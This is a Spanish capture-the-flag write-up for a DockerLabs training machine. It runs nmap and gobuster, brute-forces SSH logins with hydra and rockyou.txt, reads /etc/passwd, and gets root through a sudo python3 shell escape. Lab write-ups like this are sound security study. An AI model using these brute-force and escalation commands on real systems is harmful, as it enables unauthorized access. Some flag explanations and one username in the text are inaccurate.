# Pequeñas mentirosas

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN PequeñasMentirosas`  

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo  

![PM](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/peque%C3%B1as_mentirosas/PM_1.jpg) 

Tenemos 2 puertos abiertos, el 22 y el 80.  
Revisemos lo que está funcionando en el puerto 80.  

![PM](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/peque%C3%B1as_mentirosas/PM_2.jpg)  

De acuerdo, intentamos hacer un poco de fuzzing web para ver si podemos obtener algo útil.  
Para ello, ejecutamos el comando:  

`sudo gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`  

![PM](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/peque%C3%B1as_mentirosas/PM_3.jpg)      

Bueno, no obtuvimos nada en absoluto.   
Después de reflexionar un rato, volvemos a analizar el sitio web y probamos si **a** es el nombre de un posible usuario.   
Intentaremos realizar un ataque de fuerza bruta contra SSH.    
Ejecutaremos el comando:  

`sudo hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`  

![PM](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/peque%C3%B1as_mentirosas/PM_4.jpg)   

¡Listo!   
Ya tenemos un usuario y contraseña válidos.   
Entramos por SSH.   
Una vez dentro, probamos los comandos típicos para intentar escalar privilegios:  

`sudo -l`  

`find / -perm -4000 2>/dev/null`  

![PM](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/peque%C3%B1as_mentirosas/PM_5.jpg)     

De acuerdo, debemos buscar otra forma.   
Verificamos si hay otros usuarios en la máquina.   
Ejecutamos `cat /etc/passwd` y encontramos otro usuario llamado **spencer**.  

![PM](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/peque%C3%B1as_mentirosas/PM_6.jpg)       

Intentaremos nuevamente realizar un ataque de fuerza bruta contra SSH.  

`sudo hydra -l spences -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`    

![PM](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/peque%C3%B1as_mentirosas/PM_7.jpg)        

¡Perfecto!   
Ahora cambiaremos de usuario con el comando `su spencer`.  

![PM](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/peque%C3%B1as_mentirosas/PM_8.jpg)       

Ahora intentamos escalar privilegios para convertirnos en root.    
Ejecutamos el comando `sudo -l`.  

![PM](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/peque%C3%B1as_mentirosas/PM_9.jpg)    

Ahora revisaremos en la web de GTFOBins si podemos aprovechar este binario para convertirnos en root.  

![PM](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/peque%C3%B1as_mentirosas/PM_10.jpg)    

Ahora probaremos a ejecutar el comando:  

`sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'`  

![PM](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/peque%C3%B1as_mentirosas/PM_11.jpg)    

¡Y listo!   
¡Ya somos root!  



